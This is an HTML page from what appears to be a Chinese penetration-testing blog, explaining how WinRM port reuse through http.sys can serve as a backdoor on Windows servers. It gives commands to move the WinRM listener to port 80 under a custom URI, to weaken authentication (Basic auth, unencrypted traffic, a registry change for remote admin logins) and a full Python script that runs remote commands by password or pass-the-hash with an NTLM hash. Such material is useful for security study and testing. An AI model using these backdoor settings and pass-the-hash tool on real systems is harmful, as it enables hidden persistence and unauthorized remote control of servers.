@@ -1,0 +1,394 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>winRM端口复用 | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="原理基本原理是利用windows的远程管理服务WinRM,在Windows 2003 Server加入了内核级驱动程序(http.sys),用于监听http流量并根据URL进行处理，允许任意用户进程共享用于HTTP流量的TCP端口。通过http.sys,多个进程可以同时监听同一端口的HTTP流量
+系统默认有10个DACl，可以通过netsh http show urlacl看到具体内容，其中5985是http端口，5986是https，在我的Windows Server 2012上面默认没有开启，只开启了一个5985端口。
+利用条件Windows 2008默认不开启该服务，windows 2012以及以上默认开启该服务。
+开启服务本地机器需要连接远程WinRM服务的时候，本地也需要开启WinRM服务，然后设置信任连接的主机，执行命令:
+winrm quickconfig -q
+winrm set winrm&amp;#x2F;config&amp;#x2F;Client @&amp;#123;TrustedHosts&amp;#x3D;&amp;quot;*&amp;quot;&amp;#125;
+连接(默认端口是5985，需要加上去):
+winrs -r:http:&amp;#x2F;&amp;#x2F;&amp;lt;ip&amp;gt;:&amp;lt;port&amp;gt; -u:&amp;lt;user&amp;gt; -p:&amp;lt;pass&amp;gt; &amp;lt;command&amp;gt;"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="winRM端口复用"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> winRM端口复用</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>基本原理是利用windows的远程管理服务WinRM,在Windows 2003 Server加入了内核级驱动程序(http.sys),用于监听http流量并根据URL进行处理，允许任意用户进程共享用于HTTP流量的TCP端口。通过http.sys,多个进程可以同时监听同一端口的HTTP流量</p>
+<p>系统默认有10个DACl，可以通过<code>netsh http show urlacl</code>看到具体内容，其中5985是http端口，5986是https，在我的Windows Server 2012上面默认没有开启，只开启了一个5985端口。</p>
+<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>Windows 2008默认不开启该服务，windows 2012以及以上默认开启该服务。</p>
+<h3 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h3><p>本地机器需要连接远程WinRM服务的时候，本地也需要开启WinRM服务，然后设置信任连接的主机，执行命令:</p>
+<pre class="line-numbers language-none"><code class="language-none">winrm quickconfig -q
+winrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>连接(默认端口是5985，需要加上去):</p>
+<pre class="line-numbers language-none"><code class="language-none">winrs -r:http:&#x2F;&#x2F;&lt;ip&gt;:&lt;port&gt; -u:&lt;user&gt; -p:&lt;pass&gt; &lt;command&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="设置后门"><a href="#设置后门" class="headerlink" title="设置后门:"></a>设置后门:</h3><pre class="line-numbers language-none"><code class="language-none">修改默认端口为80: winrm set winrm&#x2F;config&#x2F;Listener?Address&#x3D;*+Transport&#x3D;HTTP @&#123;Port&#x3D;&quot;80&quot;&#125;
+还原为5985: winrm set winrm&#x2F;config&#x2F;Listener?Address&#x3D;*+Transport&#x3D;HTTP @&#123;Port&#x3D;&quot;5985&quot;&#125;
+设置URI: winrm set winrm&#x2F;config&#x2F;Listener?Address&#x3D;*+Transport&#x3D;HTTP @&#123;URLPrefix&#x3D;&quot;lalala&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><pre class="line-numbers language-none"><code class="language-none">查看注册的URL: netsh http show servicestate
+查看监听配置: winrm e winrm&#x2F;config&#x2F;listener
+查看配置: winrm get winrm&#x2F;config
+新增80端口监听: winrm set winrm&#x2F;config&#x2F;service @&#123;EnableCompatibilityHttpListener&#x3D;&quot;true&quot;&#125;
+删除80端口监听: winrm set winrm&#x2F;config&#x2F;service @&#123;EnableCompatibilityHttpListener&#x3D;&quot;false&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="设置明文连接"><a href="#设置明文连接" class="headerlink" title="设置明文连接"></a>设置明文连接</h3><p>使用pywinrm的时候，如果是直接使用账户密码，在transport可以不用设置，但是需要在服务端设置winrm使用不加密连接:</p>
+<pre class="line-numbers language-none"><code class="language-none">winrm set winrm&#x2F;config&#x2F;service&#x2F;auth &#39;@&#123;Basic&#x3D;&quot;true&quot;&#125;&#39;
+winrm set winrm&#x2F;config&#x2F;service &#39;@&#123;AllowUnencrypted&#x3D;&quot;true&quot;&#125;&#39;
+
+s &#x3D;  winrm.Session(&quot;http:&#x2F;&#x2F;192.168.1.26:5985&quot;,auth&#x3D;(&quot;administrator&quot;,&quot;123456&quot;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>当设置basic可以认证的时候，请求5985可以看到有两种认证方式: <code>Negotiate</code>和<code>basic</code>, <code>basic</code>和普通的head头认证一样，需要base64编码</p>
+<h3 id="winrs-py"><a href="#winrs-py" class="headerlink" title="winrs.py"></a>winrs.py</h3><p>实现一个winrs的客户端，执行cmd命令。因为在pywirnm的源代码里面的powershell是这样的，他调用的还是run_cmd函数，而且是直接<code>powershell -encodedcommand</code>,这很不清。所以只需要完成执行cmd命令，自己写powershell调用就好了。</p>
+<pre class="line-numbers language-none"><code class="language-none">def run_ps(self, script):
+        &quot;&quot;&quot;base64 encodes a Powershell script and executes the powershell
+        encoded script command
+        &quot;&quot;&quot;
+        # must use utf16 little endian on windows
+        encoded_ps &#x3D; b64encode(script.encode(&#39;utf_16_le&#39;)).decode(&#39;ascii&#39;)
+        rs &#x3D; self.run_cmd(&#39;powershell -encodedcommand &#123;0&#125;&#39;.format(encoded_ps))
+        if len(rs.std_err):
+            # if there was an error message, clean it it up and make it human
+            # readable
+            rs.std_err &#x3D; self._clean_error_msg(rs.std_err)
+        return rs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="成品"><a href="#成品" class="headerlink" title="成品"></a>成品</h3><pre class="line-numbers language-none"><code class="language-none"># 代码参考: https:&#x2F;&#x2F;lianzhang.org&#x2F;index.php&#x2F;archives&#x2F;8&#x2F;
+#!&#x2F;usr&#x2F;bin&#x2F;env python
+# encoding: utf-8
+import argparse
+import urlparse
+import requests
+import winrm
+import sys
+
+
+def GetUrlState(url):
+	r &#x3D; requests.get(url)
+	if r.status_code &#x3D;&#x3D; 405:
+		return True
+	else:
+		return False
+
+
+def ParseUrl(url):
+	parse &#x3D; urlparse.urlparse(url)
+	uri &#x3D; parse.path
+	ip &#x3D; parse.netloc
+	port &#x3D; 80 if parse.port is None else parse.port
+	return ip,port,uri
+
+
+def RunCmd(ip,port,uri,cmd,**kwargs):
+	if kwargs.get(&quot;hashpasswd&quot;):
+		try:
+			Windwoscmd &#x3D; winrm.Session(&#39;http:&#x2F;&#x2F;&#39; + ip + &quot;:&quot; + str(port) + uri, auth&#x3D;(kwargs.get(&quot;user&quot;), &#39;00000000000000000000000000000000:&#39;+kwargs.get(&quot;hashpasswd&quot;)),
+		                           transport&#x3D;&quot;ntlm&quot;, server_cert_validation&#x3D;&#39;ignore&#39;)
+			Result &#x3D; Windwoscmd.run_cmd(str(cmd))
+			sys.stdout.write(Result.std_err.decode(&#39;gbk&#39;))
+			sys.stdout.write(Result.std_out.decode(&#39;gbk&#39;))
+			sys.stdout.write(&#39;\n&#39;)
+		except Exception as ex:
+			print &quot;[+]&gt; Hash发生错误:&quot; + str(ex)
+	else:
+		try:
+			Windwoscmd &#x3D; winrm.Session(&#39;http:&#x2F;&#x2F;&#39; + ip + &quot;:&quot; + str(port) + uri, auth&#x3D;(kwargs.get(&quot;user&quot;), kwargs.get(&quot;passwd&quot;)),
+			                           transport&#x3D;&quot;basic&quot;, server_cert_validation&#x3D;&#39;ignore&#39;)
+			Result &#x3D; Windwoscmd.run_cmd(str(cmd))
+			sys.stdout.write(Result.std_err.decode(&#39;gbk&#39;))
+			sys.stdout.write(Result.std_out.decode(&#39;gbk&#39;))
+			sys.stdout.write(&#39;\n&#39;)
+		except Exception as ex:
+			print &quot;[+]&gt; Pass发生错误:&quot; + str(ex)
+
+
+if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
+	#windows 2008上面是LM-HASH:NTLM-HASH的方式，需要修改源代码，去掉上面的一堆0加上冒号
+	#windows 2012以及之后只能抓到NTLM的Hash，直接使用即可
+	example_text &#x3D; &#39;&#39;&#39;example:
+	python winrs.py -r http:&#x2F;&#x2F;192.168.1.26:5985&#x2F;wsman -u administrator -H 32ed87bdb5fdc5e9cba88547376818d4 -c &quot;whoami&quot;
+	&#39;&#39;&#39;
+	parser &#x3D; argparse.ArgumentParser(description&#x3D;&#39;WinRMTTools, only work &gt;&#x3D; Windows Server 2012&#39;,epilog&#x3D;example_text)
+	parser.add_argument(&quot;-r&quot;, &quot;--remote&quot;, metavar&#x3D;&quot;&quot;, required&#x3D;True, help&#x3D;&quot;http:&#x2F;&#x2F;192.168.1.26:5985&#x2F;wsman&quot;)
+	parser.add_argument(&quot;-u&quot;, &quot;--user&quot;, metavar&#x3D;&quot;&quot;, help&#x3D;&quot;username&quot;, default&#x3D;&quot;administrator&quot;)
+	parser.add_argument(&quot;-p&quot;, &quot;--passwd&quot;, metavar&#x3D;&quot;&quot;, help&#x3D;&quot;password&quot;, default&#x3D;&quot;&quot;)
+	parser.add_argument(&quot;-H&quot;, &quot;--hashpasswd&quot;, metavar&#x3D;&quot;&quot;, help&#x3D;&quot;NTLM-Hash&quot;, default&#x3D;&quot;&quot;)
+	parser.add_argument(&quot;-c&quot;, &quot;--command&quot;, metavar&#x3D;&quot;&quot;, help&#x3D;&quot;cmd&quot;, default&#x3D;&quot;whoami&quot;)
+	args &#x3D; parser.parse_args()
+	if GetUrlState(args.remote):
+		ip, port, uri &#x3D; ParseUrl(args.remote)
+		RunCmd(ip, port, uri, args.command, user&#x3D;args.user, passwd&#x3D;args.passwd, hashpasswd&#x3D;args.hashpasswd)
+	else:
+		print &quot;[*]&gt; Windwos WinRM服务未开启请检查服务是否开启！&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ol>
+<li>WinRM服务受UAC影响，本地管理员用户组只有administrator可以登录，其他管理员用户无法远程登录WinRM，如果要允许其他管理员用户远程登录WinRM，需要修改注册表:</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="2">
+<li>修改URLPrefix之后，因为pywinrm默认搜索wsman，所以如果修改URLPrefix之后程序需要重写。</li>
+</ol>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0x4D75/p/11381449.html">https://www.cnblogs.com/0x4D75/p/11381449.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://lianzhang.org/index.php/archives/8/">https://lianzhang.org/index.php/archives/8/</a></li>
+<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/1004/">https://paper.seebug.org/1004/</a></li>
+<li><a target="_blank" rel="noopener" href="https://threathunter.org/topic/5940a6e59c58e020408a79ea">https://threathunter.org/topic/5940a6e59c58e020408a79ea</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.4hou.com/technology/19806.html">https://www.4hou.com/technology/19806.html</a></li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2019/10/23/winrm.html" class="leancloud-visitors view" data-flag-title="winRM端口复用">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2019/10/23/php-eval-proxy.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2019/09/17/nginx_path_traversle.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2019-10-23 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Pentest/">Pentest<span>42</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-article-text">原理</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-article-text">利用条件</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%BC%80%E5%90%AF%E6%9C%8D%E5%8A%A1"><span class="toc-article-text">开启服务</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%AE%BE%E7%BD%AE%E5%90%8E%E9%97%A8"><span class="toc-article-text">设置后门:</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-article-text">常用命令</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%AE%BE%E7%BD%AE%E6%98%8E%E6%96%87%E8%BF%9E%E6%8E%A5"><span class="toc-article-text">设置明文连接</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#winrs-py"><span class="toc-article-text">winrs.py</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%88%90%E5%93%81"><span class="toc-article-text">成品</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-article-text">注意事项</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
